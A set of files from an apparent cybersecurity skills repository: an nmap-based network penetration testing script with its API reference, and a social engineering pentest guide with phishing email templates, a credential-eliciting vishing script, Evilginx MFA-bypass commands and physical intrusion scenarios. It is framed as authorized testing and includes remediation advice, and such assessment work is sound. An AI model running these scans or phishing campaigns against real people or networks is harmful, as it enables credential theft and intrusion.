   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/conducting-network-penetration-test/references/api-reference.md =====
# API Reference: Network Penetration Testing Agent

## Overview

Automates network penetration testing: host discovery, TCP SYN scanning with service detection, vulnerability scanning with NSE scripts, SMB enumeration, and SSL auditing. For authorized penetration testing only.

## Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| python-nmap | >=0.7.1 | Nmap scan orchestration |

## CLI Usage

```bash
# Full pentest
python agent.py --target 192.168.1.0/24 --ports 1-10000 --output report.json

# Host discovery only
python agent.py --target 10.0.0.0/24 --discovery-only
```

## Key Functions

### `host_discovery(target_network)`
Discovers live hosts using ARP ping and ICMP echo with TCP ACK probes on common ports.

### `port_scan(target, ports, scan_type)`
Performs TCP SYN scan with service version detection (`-sV`), OS detection (`-O`), and banner grabbing.

### `vulnerability_scan(target, ports)`
Runs Nmap vulnerability scripts (`vulners`, `vulscan`) to identify CVEs for detected services.

### `smb_enumeration(target)`
Enumerates SMB shares, users, and OS information via Nmap scripts on ports 139/445.

### `ssl_audit(target, port)`
Audits SSL/TLS cipher suites and certificate details using `ssl-enum-ciphers` and `ssl-cert`.

### `dns_enumeration(domain)`
Performs DNS subdomain brute-forcing using `dns-brute` NSE script.

### `classify_findings(scan_results, vuln_results)`
Classifies vulnerabilities by severity (Critical, High, Medium) based on script output analysis.

## Nmap Scan Types Used

| Argument | Purpose |
|----------|---------|
| `-sn -PE -PA` | Host discovery (ping scan) |
| `-sS -sV -O` | SYN scan with version and OS detection |
| `--script=vulners` | CVE vulnerability lookup |
| `--script=smb-enum-shares` | SMB share enumeration |
| `--script=ssl-enum-ciphers` | SSL/TLS cipher audit |
| `--script=dns-brute` | DNS subdomain enumeration |

## Output Schema

```json
{
  "hosts": [{"ip": "...", "hostname": "..."}],
  "services": [{"ip": "...", "services": [{"port": 80, "service": "http"}]}],
  "vulnerabilities": [{"host": "...", "severity": "Critical", "details": {...}}],
  "summary": {"critical": 3, "high": 12, "medium": 45}
}
```

===== END FILE =====


===== FILE: skills/conducting-network-penetration-test/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and lab environments only
"""Network Penetration Testing Agent - Automates host discovery, port scanning, and vuln assessment."""

import json
import logging
import argparse
from datetime import datetime

import nmap

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def host_discovery(target_network):
    """Discover live hosts on the network using ARP ping and ICMP."""
    scanner = nmap.PortScanner()
    scanner.scan(hosts=target_network, arguments="-sn -PE -PA21,22,80,443")
    hosts = []
    for host in scanner.all_hosts():
        if scanner[host].state() == "up":
            hosts.append({
                "ip": host,
                "hostname": scanner[host].hostname(),
                "state": scanner[host].state(),
            })
    logger.info("Host discovery: %d live hosts on %s", len(hosts), target_network)
    return hosts


def port_scan(target, ports="1-10000", scan_type="-sS"):
    """Perform TCP SYN scan with service version detection."""
    scanner = nmap.PortScanner()
    scanner.scan(hosts=target, ports=ports, arguments=f"{scan_type} -sV -O --script=banner")
    results = []
    for host in scanner.all_hosts():
        host_info = {
            "ip": host,
            "hostname": scanner[host].hostname(),
            "os_match": [],
            "services": [],
        }
        if "osmatch" in scanner[host]:
            host_info["os_match"] = [
                {"name": m["name"], "accuracy": m["accuracy"]}
                for m in scanner[host]["osmatch"][:3]
            ]
        for proto in scanner[host].all_protocols():
            for port in scanner[host][proto]:
                svc = scanner[host][proto][port]
                host_info["services"].append({
                    "port": port,
                    "protocol": proto,
                    "state": svc["state"],
                    "service": svc.get("name", ""),
                    "version": svc.get("version", ""),
                    "product": svc.get("product", ""),
                    "extrainfo": svc.get("extrainfo", ""),
                })
        results.append(host_info)
    logger.info("Port scan: %d hosts, %d total services",
                len(results), sum(len(h["services"]) for h in results))
    return results


def vulnerability_scan(target, ports="1-1024"):
    """Run Nmap vulnerability scripts against target."""
    scanner = nmap.PortScanner()
    scanner.scan(
        hosts=target, ports=ports,
        arguments="-sV --script=vulners,vulscan/vulscan.nse --script-args vulscan/vulscan.db=cve.csv"
    )
    vulns = []
    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            for port in scanner[host][proto]:
                svc = scanner[host][proto][port]
                scripts = svc.get("script", {})
                if scripts:
                    vulns.append({
                        "host": host,
                        "port": port,
                        "service": svc.get("name", ""),
                        "version": svc.get("version", ""),
                        "scripts": scripts,
                    })
    logger.info("Vulnerability scan: %d services with script output", len(vulns))
    return vulns


def smb_enumeration(target):
    """Enumerate SMB shares and users via Nmap scripts."""
    scanner = nmap.PortScanner()
    scanner.scan(
        hosts=target, ports="139,445",
        arguments="--script=smb-enum-shares,smb-enum-users,smb-os-discovery"
    )
    results = {}
    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            for port in [139, 445]:
                if port in scanner[host][proto]:
                    scripts = scanner[host][proto][port].get("script", {})
                    results[host] = scripts
    logger.info("SMB enumeration: %d hosts responded", len(results))
    return results


def ssl_audit(target, port=443):
    """Audit SSL/TLS configuration using Nmap ssl-enum-ciphers."""
    scanner = nmap.PortScanner()
    scanner.scan(
        hosts=target, ports=str(port),
        arguments="--script=ssl-enum-ciphers,ssl-cert"
    )
    results = {}
    for host in scanner.all_hosts():
        if port in scanner[host].get("tcp", {}):
            results[host] = scanner[host]["tcp"][port].get("script", {})
    return results


def dns_enumeration(domain):
    """Perform DNS enumeration via Nmap dns-brute."""
    scanner = nmap.PortScanner()
    scanner.scan(hosts=domain, arguments="--script=dns-brute")
    return scanner.get_nmap_last_output()


def classify_findings(scan_results, vuln_results):
    """Classify and prioritize all findings by severity."""
    findings = []
    for vuln in vuln_results:
        severity = "Medium"
        scripts = vuln.get("scripts", {})
        script_text = json.dumps(scripts).lower()
        if "critical" in script_text or "cve-2" in script_text:
            severity = "Critical"
        elif "high" in script_text:
            severity = "High"
        findings.append({
            "host": vuln["host"],
            "port": vuln["port"],
            "service": vuln["service"],
            "severity": severity,
            "details": scripts,
        })
    findings.sort(key=lambda x: {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}.get(x["severity"], 4))
    return findings


def generate_report(hosts, scan_results, vuln_findings, smb_results):
    """Generate network penetration test report."""
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "scope": f"{len(hosts)} live hosts discovered",
        "hosts": hosts,
        "services": scan_results,
        "vulnerabilities": vuln_findings,
        "smb_enumeration": smb_results,
        "summary": {
            "critical": len([f for f in vuln_findings if f["severity"] == "Critical"]),
            "high": len([f for f in vuln_findings if f["severity"] == "High"]),
            "medium": len([f for f in vuln_findings if f["severity"] == "Medium"]),
        },
    }
    print(f"NETWORK PENTEST REPORT: {len(hosts)} hosts, {len(vuln_findings)} vulnerabilities")
    return report


def main():
    parser = argparse.ArgumentParser(description="Network Penetration Testing Agent")
    parser.add_argument("--target", required=True, help="Target host/network CIDR")
    parser.add_argument("--ports", default="1-10000", help="Port range to scan")
    parser.add_argument("--discovery-only", action="store_true", help="Only perform host discovery")
    parser.add_argument("--output", default="network_pentest_report.json")
    args = parser.parse_args()

    hosts = host_discovery(args.target)

    if args.discovery_only:
        with open(args.output, "w") as f:
            json.dump({"hosts": hosts}, f, indent=2)
        return

    scan_results = []
    vuln_results = []
    smb_results = {}

    for host in hosts:
        ip = host["ip"]
        scan = port_scan(ip, args.ports)
        scan_results.extend(scan)
        vulns = vulnerability_scan(ip)
        vuln_results.extend(vulns)
        smb = smb_enumeration(ip)
        smb_results.update(smb)

    findings = classify_findings(scan_results, vuln_results)
    report = generate_report(hosts, scan_results, findings, smb_results)

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/conducting-social-engineering-penetration-test/SKILL.md =====
---
name: conducting-social-engineering-penetration-test
description: Design and execute a social engineering penetration test combining OSINT-driven target profiling with phishing, vishing, smishing, and physical pretexting campaigns using tools like GoPhish, the Social Engineer Toolkit (SET), and Evilginx to measure human security resilience. Use when scoping or running an authorized human-attack-surface test and reporting results to identify security awareness training gaps.
domain: cybersecurity
subdomain: penetration-testing
tags:
- social-engineering
- phishing
- vishing
- pretexting
- GoPhish
- SET
- OSINT
- security-awareness
- red-team
version: '1.0'
author: mahipal
license: Apache-2.0
atlas_techniques:
- AML.T0088
- AML.T0052
nist_ai_rmf:
- GOVERN-6.2
- MAP-5.2
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1566
- T1598
- T1566.004
- T1204.001
- T1589
mitre_f3:
  version: '1.1'
  tactics:
  - reconnaissance
  - initial-access
  - resource-development
  techniques:
  - id: T1598
    name: Phishing for Information
    tactic: reconnaissance
    source: attack
  - id: T1660
    name: Phishing
    tactic: initial-access
    source: attack
  - id: F1029
    name: Gather Customer Information
    tactic: reconnaissance
    source: f3
  - id: F1032
    name: Impersonate Official
    tactic: initial-access
    source: f3
  - id: T1557
    name: Adversary-in-the-Middle
    tactic: initial-access
    source: attack
  - id: F1020.002
    name: 'Create Fake Materials: Fake Website'
    tactic: resource-development
    source: f3
---

# Conducting Social Engineering Penetration Test

## Overview

Social engineering penetration testing assesses an organization's human attack surface through controlled simulation of real-world deception techniques. According to Verizon DBIR 2024, the human element is involved in approximately 68% of all breaches, with phishing remaining the dominant initial access vector. This skill covers phishing, vishing (voice phishing), smishing (SMS phishing), and physical pretexting campaigns using tools like GoPhish, the Social Engineer Toolkit (SET), and Evilginx.


## When to Use

- When conducting security assessments that involve conducting social engineering penetration test
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Written authorization from senior management (CISO/CTO)
- Legal review confirming compliance with local laws (CFAA, GDPR, etc.)
- Defined scope: target employee groups, attack types, exclusions
- GoPhish server, domain for phishing infrastructure, VPS
- OSINT tools: Maltego, theHarvester, LinkedIn scraping tools
- Coordination with HR and Legal for employee notification post-test

## Phase 1 — OSINT and Target Profiling

### Employee Reconnaissance

```bash
# Email harvesting
theHarvester -d targetcorp.com -b all -l 500 -f harvester_results

# LinkedIn OSINT (manual + tools)
# Gather: names, roles, departments, email format
# Identify: new hires, IT admins, finance team, executives

# Email format discovery
# Check: first.last@, flast@, firstl@
# Verify with: hunter.io, phonebook.cz, email-checker.net

# Social media OSINT
# Twitter/X: employees posting about work tools/frustrations
# Facebook: corporate event photos, office layout
# GitHub: employee repos with corporate email addresses

# Domain intelligence
dig targetcorp.com MX +short
dig targetcorp.com TXT +short
# Check for SPF, DKIM, DMARC records
# Weak DMARC = easier email spoofing

# Check breach databases (authorized)
# HaveIBeenPwned API for corporate emails
# Identify employees with compromised credentials
```

### Target Selection Matrix

| Group | Count | Pretext | Attack Vector |
|-------|-------|---------|--------------|
| Finance | 15 | Invoice approval | Phishing (credential harvest) |
| IT Help Desk | 8 | Password reset | Vishing |
| Executives | 5 | Board meeting update | Spear phishing |
| New Hires (< 90 days) | 12 | HR onboarding form | Phishing (payload) |
| All Employees | 200 | IT security update | Broad phishing |

## Phase 2 — Phishing Campaign

### Infrastructure Setup

```bash
# Register lookalike domain
# targetcorp.com -> targetc0rp.com, targetcorp-secure.com, targetcorp.net

# Set up GoPhish server
sudo apt install gophish
# Edit config.json for admin and phishing server ports
gophish

# Configure sending profile in GoPhish
# SMTP server: mail.attackdomain.com
# From: it-security@targetcorp-secure.com
# Headers: proper DKIM/SPF for attack domain

# Create landing page (credential harvesting)
# Clone legitimate login page (Office 365, Okta, etc.)
# GoPhish: Import Site -> https://login.microsoftonline.com
# Enable: Capture Credentials, Capture Passwords
# Redirect to real site after capture

# Set up Evilginx for MFA bypass (authorized testing only)
evilginx2
: config domain attackdomain.com
: config ipv4 <server_ip>
: phishlets hostname o365 login.targetcorp-secure.com
: phishlets enable o365
: lures create o365
: lures get-url 0
```

### GoPhish Campaign Configuration

```json
{
  "campaign": {
    "name": "IT Security Update - Q1 2025",
    "template": {
      "name": "Mandatory Security Training",
      "subject": "Action Required: Complete Security Awareness Training by Friday",
      "html": "<html>...[branded email with urgency]...</html>",
      "from": "IT Security Team <security@targetcorp-secure.com>"
    },
    "landing_page": "Office 365 Login Clone",
    "sending_profile": "Phishing SMTP",
    "groups": ["All Employees - Batch 1"],
    "launch_date": "2025-03-10T09:00:00Z",
    "send_by_date": "2025-03-10T12:00:00Z"
  }
}
```

### Phishing Email Templates by Pretext

**Template 1 — IT Security Update:**
```
Subject: [Action Required] Mandatory Password Reset - Security Incident
From: IT Security <security@targetcorp-secure.com>

Dear {FirstName},

Our security team has detected unauthorized access attempts on our systems.
As a precautionary measure, all employees must reset their passwords immediately.

Please click below to reset your password within the next 24 hours:

[Reset Password Now] -> {phishing_url}

Failure to comply may result in temporary account suspension.

Thank you,
IT Security Team
```

**Template 2 — Finance Invoice:**
```
Subject: Invoice #INV-2025-4821 - Approval Required
From: Accounts Payable <ap@targetcorp-secure.com>

Hi {FirstName},

Please review and approve the attached invoice from our vendor.
Amount: $47,250.00 | Due: March 15, 2025

[View Invoice] -> {phishing_url}

Best regards,
Accounts Payable
```

## Phase 3 — Vishing Campaign

### Call Script Template

```
Pretext: IT Help Desk calling about suspicious login

Caller: "Hi, this is [Name] from the IT Help Desk. Am I speaking with [Target Name]?"

[Wait for confirmation]

Caller: "We've detected some unusual login activity on your account from an
unrecognized location. For your protection, I need to verify your identity
before we can investigate further."

Caller: "Can you confirm your employee ID and the email address associated
with your account?"

[Record responses]

Caller: "Thank you. I'm going to send you a verification link to confirm
it's really you. Can you click on it and enter your credentials so we can
secure your account?"

[Send phishing link via email/SMS during call]

Caller: "Great, I can see you've been verified. Your account is now secured.
If you notice any further issues, please call the help desk at [real number]."
```

### Vishing Metrics to Track

| Metric | Description |
|--------|-------------|
| Call answered | Target picked up the phone |
| Engaged | Target continued conversation past initial question |
| Information disclosed | Target provided credentials, employee ID, or PII |
| Link clicked | Target clicked the verification link |
| Credentials entered | Target entered credentials on phishing page |
| Reported | Target reported the call to security |

## Phase 4 — Physical Social Engineering

### Physical Pretexting Scenarios

```
Scenario 1: Delivery Person
- Arrive with package labeled for executive
- Request access to deliver personally
- Attempt to tailgate through secure doors
- Drop USB drives in common areas

Scenario 2: IT Vendor
- Arrive with vendor badge (printed)
- Claim scheduled maintenance on network closet
- Attempt to access server rooms
- Install rogue wireless AP if access gained

Scenario 3: New Employee
- Arrive claiming first day orientation
- Request temporary badge
- Attempt to access restricted areas
- Photograph sensitive screens/documents

Evidence Collection:
- Body camera (if legally permitted and authorized)
- Photographs of accessed areas
- WiFi probe from rogue AP
- Notes on which doors/checkpoints bypassed
```

## Phase 5 — Metrics and Analysis

### Campaign Results Dashboard

```
Phishing Campaign Results:
├── Emails Sent: 200
├── Emails Delivered: 195 (97.5%)
├── Emails Opened: 142 (72.8%)
├── Links Clicked: 68 (34.9%)
├── Credentials Submitted: 31 (15.9%)
├── MFA Bypassed: 8 (4.1%)  [Evilginx]
├── Reported to SOC: 12 (6.2%)
└── No Action: 53 (27.2%)

Vishing Campaign Results:
├── Calls Made: 23
├── Calls Answered: 18 (78.3%)
├── Engaged in Conversation: 15 (65.2%)
├── Information Disclosed: 9 (39.1%)
├── Credentials Provided: 4 (17.4%)
└── Reported to Security: 2 (8.7%)

Physical Assessment:
├── Tailgating Successful: 3/5 attempts
├── USB Drives Plugged In: 2/10 dropped
├── Restricted Areas Accessed: 2/4 attempted
└── Challenged by Employee: 1 time
```

### Risk Scoring

| Attack Vector | Success Rate | Risk Level | Priority |
|--------------|-------------|------------|----------|
| Phishing (credential harvest) | 15.9% | High | P1 |
| Vishing (info disclosure) | 39.1% | Critical | P1 |
| Physical tailgating | 60% | High | P2 |
| USB drop | 20% | Medium | P3 |
| Spear phishing (exec) | 40% | Critical | P1 |

## Phase 6 — Reporting and Recommendations

### Remediation Priorities

| Priority | Recommendation | Timeline |
|----------|---------------|----------|
| P1 | Deploy phishing-resistant MFA (FIDO2/WebAuthn) | 30 days |
| P1 | Implement targeted security awareness training | 14 days |
| P1 | Deploy email gateway with URL rewriting | 30 days |
| P2 | Strengthen physical access controls (mantraps, visitor badges) | 60 days |
| P2 | Implement security champion program per department | 30 days |
| P3 | Deploy USB device control policy | 30 days |
| P3 | Establish phishing reporting button in email client | 14 days |

## Tools Reference

| Tool | Purpose |
|------|---------|
| GoPhish | Phishing campaign management platform |
| Evilginx2 | MFA bypass via reverse proxy phishing |
| Social Engineer Toolkit (SET) | Social engineering attack framework |
| Maltego | OSINT and relationship mapping |
| theHarvester | Email and domain OSINT |
| King Phisher | Phishing campaign tool |
| Modlishka | Reverse proxy for credential interception |

## References

- GoPhish: https://getgophish.com/
- Evilginx2: https://github.com/kgretzky/evilginx2
- Social Engineer Toolkit: https://github.com/trustedsec/social-engineer-toolkit
- Verizon DBIR: https://www.verizon.com/business/resources/reports/dbir/
- NIST SP 800-61: Computer Security Incident Handling Guide

===== END FILE =====


===== FILE: skills/conducting-social-engineering-penetration-test/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/conducting-social-engineering-penetration-test/assets/template.md =====
# Social Engineering Penetration Test — Report Template

## Document Control
| Field | Value |
|-------|-------|
| Client | [Name] |
| Test Type | Social Engineering Assessment |
| Vectors Tested | Phishing, Vishing, Physical |
| Period | [Start] — [End] |
| Classification | CONFIDENTIAL |

## Executive Summary
[Overview of social engineering resilience, key success rates, highest risk groups]

## Campaign Results

### Phishing
| Metric | Value |
|--------|-------|
| Emails Sent | [N] |
| Open Rate | [N]% |
| Click Rate | [N]% |
| Credential Submit Rate | [N]% |
| Report Rate | [N]% |

### Vishing
| Metric | Value |
|--------|-------|
| Calls Made | [N] |
| Info Disclosed | [N]% |
| Credentials Provided | [N]% |

### Physical
| Metric | Value |
|--------|-------|
| Tailgate Success | [N/M] |
| Areas Accessed | [N] |

## Department Risk Matrix
| Department | Risk | Priority Action |
|-----------|------|----------------|
| [Dept] | [Level] | [Training type] |

## Recommendations
1. [Recommendation]

===== END FILE =====


===== FILE: skills/conducting-social-engineering-penetration-test/references/api-reference.md =====
# Social Engineering Penetration Test — API Reference

## Libraries

| Library | Install | Purpose |
|---------|---------|---------|
| requests | `pip install requests` | GoPhish REST API client |
| gophish | `pip install gophish` | Official GoPhish Python client |

## GoPhish API Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/campaigns/` | List all campaigns |
| GET | `/api/campaigns/{id}/results` | Campaign results and metrics |
| POST | `/api/campaigns/` | Create new campaign |
| POST | `/api/templates/` | Create email template |
| POST | `/api/groups/` | Create target group |
| POST | `/api/smtp/` | Create sending profile |
| POST | `/api/pages/` | Create landing page |

## Campaign Metrics

| Metric | Formula |
|--------|---------|
| Open Rate | emails_opened / emails_sent x 100 |
| Click Rate | links_clicked / emails_sent x 100 |
| Submit Rate | data_submitted / emails_sent x 100 |
| Report Rate | reported / emails_sent x 100 |

## Social Engineering Vectors

| Vector | Tools |
|--------|-------|
| Email Phishing | GoPhish, King Phisher |
| Vishing | Pretext scripts, VoIP tools |
